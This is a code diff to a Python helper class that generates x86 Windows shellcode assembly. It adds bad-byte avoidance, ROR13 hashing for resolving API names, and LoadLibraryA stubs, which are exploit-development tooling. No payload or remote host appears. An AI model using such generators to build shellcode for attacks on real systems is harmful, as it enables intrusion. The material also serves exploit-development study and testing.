@@ -13,7 +13,7 @@ from __future__ import annotations
 import re
 
 
-from shellcode.push_string import push_string
+from shellcode.push_string import push_dword, push_string
 
 class ShellcodeHelper:
     """Allocate named stack slots and emit assembly references to them."""
@@ -26,7 +26,11 @@ class ShellcodeHelper:
     _load_library = "LoadLibraryA" # needed for basic shellcode
 
     def __init__(
-        self, start_offset: int = 4, step: int = 4, base_register: str = "ebp"
+        self,
+        start_offset: int = 4,
+        step: int = 4,
+        base_register: str = "ebp",
+        bad_bytes: set[int] | None = None,
     ) -> None:
         if not isinstance(start_offset, int) or start_offset <= 0:
             raise ValueError("start_offset must be a positive integer")
@@ -40,6 +44,7 @@ class ShellcodeHelper:
         self.start_offset = start_offset
         self.step = step
         self.base_register = base_register
+        self.bad_bytes = set() if bad_bytes is None else set(bad_bytes)
         self._variables: dict[str, int] = {}
         self._sizes: dict[str, int] = {}
         self._next_offset = start_offset
@@ -111,14 +116,14 @@ class ShellcodeHelper:
     def load_library(self, name: str):
       """Emit the sequence that pushes a DLL name and calls ``LoadLibraryA``. Base address moved to EBX"""
       asm = [
-        push_string(name), # push the dll name
+        push_string(name, bad_bytes=self.bad_bytes), # push the dll name
         "push esp;",  # Push ESP as pointer to the string
         self.call_function(self._load_library), # Call LoadLibraryA
         "mov ebx, eax;", # Move the base address to EBX for find_function
       ]
       return asm
 
-    def ror_str(self, byte, count):
+    def _ror_str(self, byte, count):
       """Rotate a 32-bit value right, matching the hash routine used in shellcode."""
       value = byte & 0xFFFFFFFF
       shift = count % 32
@@ -127,7 +132,7 @@ class ShellcodeHelper:
       return ((value >> shift) | (value << (32 - shift))) & 0xFFFFFFFF
 
 
-    def push_function_hash(self, name: str):
+    def push_function_hash(self, name: str, clean_reg: str = "eax"):
         """Return the hash push instruction expected by the resolver stub."""
         edx = 0x00
         ror_count = 0
@@ -138,18 +143,18 @@ class ShellcodeHelper:
             # If it is not the last character, apply a 13-bit right rotation (0xd)
             # This ensures that each character uniquely affects the final signature
             if ror_count < len(name) - 1:
-                edx = self.ror_str(edx, 0xD)
+                edx = self._ror_str(edx, 0xD)
             ror_count += 1
         # pushes result
-        return "push " + hex(edx)
+        return push_dword(edx, clean_reg, self.bad_bytes)
 
 
-    def find_function(self, name: str):
+    def find_function(self, name: str, clean_reg: str = "eax"):
       """Emit hash push, resolver call, and stack-slot write for one API name."""
       asm = [
-        self.push_function_hash(name), # push hash of function name
-        self.call_function(self._find_func), # Call find_function
-        self.write_var(name), # save found function address to dedicated variable
+        self.push_function_hash(name, clean_reg), # push hash of function name
+        self.call_function(self._find_func), # Call find_function, result lands in EAX
+        self.write_var(name, "eax"), # save found function address in EAX to dedicated variable
       ]
       return asm
 
